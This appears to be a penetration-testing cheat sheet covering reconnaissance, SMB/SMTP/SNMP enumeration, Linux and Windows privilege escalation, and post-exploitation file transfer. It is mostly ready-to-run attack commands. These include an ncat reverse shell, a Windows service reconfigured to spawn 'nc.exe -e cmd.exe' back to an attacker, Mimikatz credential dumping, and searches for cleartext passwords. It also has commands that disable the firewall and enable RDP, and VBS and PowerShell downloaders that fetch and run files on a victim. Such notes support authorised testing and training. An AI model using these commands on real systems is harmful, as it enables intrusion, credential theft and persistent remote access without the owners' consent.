# Essential Tools

## Ncat

Encrypted Reverse Shell
```console
on victim machine (Win):
ncat --exec cmd.exe --allow <IP> -vnl <PORT> --ssl

on attacking machine (Kali):
ncat -v <IP> <PORT> --ssl

```

## Tcpdump

Read PCAP file
```console
tcpdump -r <FILE.pcap>
```

Get IP addresses & ports involved
```console
tcpdump -n -r <FILE.pcap> | awk -F " " '{print $3}' | sort -u | head
```

Filter for source and destination IPs and ports
```console
tcpdump -n src host <IP> -r <FILE.pcap> 
tcpdump -n dst host <IP> -r <FILE.pcap> 
tcpdump -n port <PORT> -r <FILE.pcap>
```

View content of a packet
```console
tcpdump -nX -s 0 -r <FILE.pcap>
```

# Passive Information Gathering

## Google

```console
site:  
-site:  
filetype: 
intitle:  
inurl:
```
more info: https://www.exploit-db.com/google-hacking-database

## Mail Harvesting

The Harvester
```console
theharvester -d <DOMAIN> -b <SEARCH ENGINE> -l <LIMIT OF RESULTS>
```

## Web Reconnaissance with Recon-NG

Generating list of employee names and mail addresses
```console
recon-ng
use recon/domains-contacts/whois_pocs
set source <DOMAIN>
run
```

Compiling a list of reported XSS vulnerabilities
```console
recon-ng
use recon/domains-vulnerabilities/xssed
set source <DOMAIN>
run
```

Search for sub-domains
```console
recon-ng
use recon/domains-hosts/google_site_web
set source <DOMAIN>
run
```

# Active Information Gathering

## DNS Enumeration

Discover DNS server
```console
host -t NS <DOMAIN/IP> | cut d " " -f 4

other types:
MX  mail
PTR pointer
TXT text record
```

DNSRecon 
```console
dnsrecon -d <DOMAIN> -t axfr
```

DNSenum
```console
dnsenum <DOMAIN>
```

Forward Lookup Brute Force
```bash
for name in $(cat list.txt);do
    host $name.<DOMAIN> | grep "has address" | cut -d " " -f 1,4
done
```

Reverse Lookup Brute Force
```bash
for ip in $(seq 1 254); do 
    host 10.11.1.$ip
done | column -t
```

### Zone transfer

```console
host -l <DOMAIN-NAME> <DNS-SERVER>
```

```bash
for server in $(host -t NS <DOMAIN> | cut -d " " -f 4); do host -l <DOMAIN> $server;done
```

Simple DNS zone transfer script
```bash
#!/bin/bash
# Simple Zone Transfer Bash Script
# $1 is the first argument given after the bash script
# Check if argument was given, if not, print usage
if [ -z "$1" ]; then
echo "[*] Simple Zone transfer script"
echo "[*] Usage : $0 <domain name> "
exit 0
fi
# if argument was given, identify the DNS servers for the domain
for server in $(host -t ns $1 |cut -d" " -f4);do

# For each of these servers, attempt a zone transfer
host -l $1 $server |grep "has address"
done
```

DNS-recon
```console
dnsrecon -d <DOMAIN-NAME> -t axfr
```

```console
dnsenum <DOMAIN-NAME>
```


## Port Scanning

Light scan
```console
nmap <IP> --top-ports 10 --open
```

Ping Sweep
```console
nmap -v -sn <IP-RANGE> -oG pingsweep.txt
grep Up pingsweep.txt | cut -d " " -f 2
```

Port Sweep
```console
nmap -p <PORT> <IP-RANGE> -oG websweep.txt
grep Up portsweep.txt | cut -d " " -f 2
```

Banner Grabbing
```console
nmap -sV -sT <IP-RANGE>
```

OS-Fingerprinting
```console
nmap -O <IP-RANGE>
```

Heavy scan
```console
nmap <IP> -p- -sV --reason --dns-server <DNS-SERVER>
```

Scanning for Top 20 used ports
```console
nmap -sT -A --top-ports=20 <IP-RANGE>
```

UDP scan
```console
nc -nv -u -z -w 1 <IP> <PORTs>
```

Connect Scanning (TCP - three-way-handshake)
```console
nc -nvv -w 1 -z <IP> <PORTs>
OR
nmap -sT (-p 1-65535) <IP>
```


## Services

```console
netstat -antp | grep <SERVICE>
```

### SSH


### Web Application

Internal/External links
```console
curl <IP> -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
```

HTML render
```console
curl <IP> -s -L | html2text -width '99' | uniq
```

Parsing Robots.txt entries
```console
parsero -u <HOST> -sb

-o  Only shows HTTP 200 codes
-sb Search in Bing indexed Disallows
```

Gobuster for URL Bruteforcing
```console
gobuster -u <HOST> \
-w /usr/share/seclists/Discovery/Web_Content/common.txt \
-s '200,204,301,302,307,403,500' -e

Other lists:
/usr/share/seclists/Discovery/Web_Content/cgis.txt
```

### SMB

Scanning for SMB
```console
nbtscan <IP range>

e.g.: 10.11.1.0/24
```

Enumerate OS version
```console
nmap -v -p 139,445 --script=smb-os-discovery <IP>
```


Null Sessions
```console
rpcclient -U "" <IP>

'srvinfo' shows server info
'enumdomusers'  shows domain users
'getdompwinfo'  shows pwd info
```

Null Sessions (Enum4Linux) 
```console
enum4linux -av <IP>
```

SMB Versions Windows
```
v1  2000, XP, Srv2003
v2  Vista SP1, Srv2008
v2.1    7, Srv2008 R2
v3  8, Srv2012
```

Get SMB version
```
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' &
smbclient -L <IP>
```

### SMTP

Enumerate user
```console
nc -nv <IP> 25
VRFY <USER>
```

User enumeration script
```bash
for user in $(cat users.txt); do echo VRFY $user | nc -nv -w 1 <IP> 25 2>/dev/null | grep ^"250";done
```

### SNMP

Enumerate #1
```console
nmap -sU --open -p 161 <IP> --open
```

Enumerate #2
```console
onesixtynine -c community.txt -i ips

public, private, manager
```

Enumerate #3
```console
snmpwalk -c public -v1 <IP>

```

Common MIB values
```
1.3.6.1.2.1.25.1.6.0    System processes
1.3.6.1.2.1.25.4.2.1.2  Running Programs
1.3.6.1.2.1.25.4.2.1.4  Processes Path
1.3.6.1.2.1.25.2.3.1.4  Storage Units
1.3.6.1.2.1.25.6.3.1.2  Software Name
1.3.6.1.4.1.77.1.2.25   User Accounts
1.3.6.1.2.1.6.13.1.3    TCP Local Ports
```


# Password attacks



# Privilege Escalation

## Linux PE

### Enumeration

Shows Linux version & kernel
```console
cat /etc/issue
uname -a
```

Search world-writeable files
```console
find / -perm -2 ! -type l -ls 2>/dev/null
```

Prints users' shell
```console
which shell
```

Find hashing algorithm used for shadow
```console
grep -rn ENCRYPT_METHOD /etc/login.defs
```

### Shell

Change shell for specific user
```console
chsh -s /bin/bash <username>
usermod -s /bin/bash <username> (ROOT required)
```

Break out of limited shells
```console
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```

### Exploits

Downloading exploit on victim
```console
wget -O <EXPLOIT.c> <EXPLOIT-URL>
gcc -o <OUTPUT> <EXPLOIT.c>
chmod +x <OUTPUT>
./<OUTPUT>
```

### File Handling

Compress zip files
```console
zip -r <FILE.zip> <FOLDER>
```

Extract zip file
```console
unzip <FILE.zip>
```

Compress tar files
```console
tar -cvf <FILE.tar> <FOLDER>
```

Extract tar file
```console
tar -xvf <FILE.tar>
```

Compress tar.gz files
```console
tar -zcvf <FILE.tar.gz> <FOLDER>
```

Extract tar.gz file
```console
tar -zxvf <FILE.tar.gz>
```

Compress tar.bz2 files
```console
tar -jcvf <FILE.tar.bz2> <FOLDER>
```

Extract tar.bz2 file
```console
tar -jxvf <FILE>
```

## Windows PE

### Enumeration

Sysinfo
```console
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname
echo %username%
```

Network Enum
```console
ipconfig /all
route print
arp -A
netstat -ano    shows all active NW connections

netsh firewall show state   shows FW info (>= WinXP SP2)
netsh firewall show config
```

Firewall Enum
```console
netsh firewall show state

netsh firewall show config
```

User Enum
```console
net users
net user <USER>
```

Show all hosts in that domain
```console
net view /domain
```


### Weak services

Shows all scheduled tasks
```console
schtasks /query /fo LIST /v
```

Shows all running processes
```console
tasklist /SVC
```

Shows all started services
```console
net start
```

Find weak services
```console
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -ucqv <SERVICE>
```

Find all weak folder permissions per drive
```
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
```

Find all weak file permissions per drive
```
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

Modify weak services
```
sc qc <SERVICE>
sc config <SERVICE> binbath= "C:\nc.exe -nv <IP> <PORT> -e C:\Windows\System32\cmd.exe"
sc config <SERVICE> obj= ".\LocalSystem" password= ""
net start <SERVICE>
```

Using Priv-Esc-Checking tool
```console
windows-privesc-check2.exe --audit -a -o report
```

### Passwords

Check specific files for cleartext pwds
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
%SYSVOL%\*\Groups.xml

more to find:
https://www.fuzzysecurity.com/tutorials/16.html
```

Searching for clear-text pwds
```
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Mimikatz

Enable log file (mimikatz.log)
```console
standard::log
```

Enable debugging
```console
privilege::debug
```

List all provider credentials
```console
sekurlsa::logonpasswords
```


### Exploits

Generating EXE from Python exploit
```console
python pyinstaller.py --onefile <EXPLOIT.py>
```

Cross compiling
```console
i686-w64-mingw32-gcc <EXPLOIT.c> -lws2_32 -o <BINARY>
```

### Misc

Activate RDP
```console
reg add “HKLM\SYSTEM\CurentControlSet\Control\Terminal Server”  /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Deactivate Firewall
```console
netsh firewall set opmode disable
```


# Client Side attacks


# Post Exploitation

## File Transfer

### TFTP

Setting up TFTP server
```console
atftpd --daemon --port 69 <DIR>
```

Downloading file from victim
```console
tftp -i <IP-ATTACKER> PUSH <FILE>
```

Uploading file to victim
```console
tftp -i <IP-ATTACKER> GET <FILE>
```

### FTP

Create designated FTP user 
```bash
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

Uploading specific file to victim
```console
echo open <IP> 21 > ftp.txt
echo USER offsec >> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
echo GET <FILE> >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```
### Scripting Language

Script for uploading files to a victim using VBS
```vb
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Uploading files using this script
```console
script wget.vbs http://<IP>/<FILE> <FILE>
```

### Powershell

Simple script to upload files
```bash
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "http://<IP>/<FILE>" >> wget.ps1
echo $file = "FILE NAME" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1
```

Uploading files using this script
```ps1
powershell.exe --ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

### Debug.exe
Limit of 64k in file size

Compress file
```console
upx -9 <FILE>
```

Converting EXE -> TXT
```console
wine exe2bat.exe <FILE.exe> <FILE.txt>
```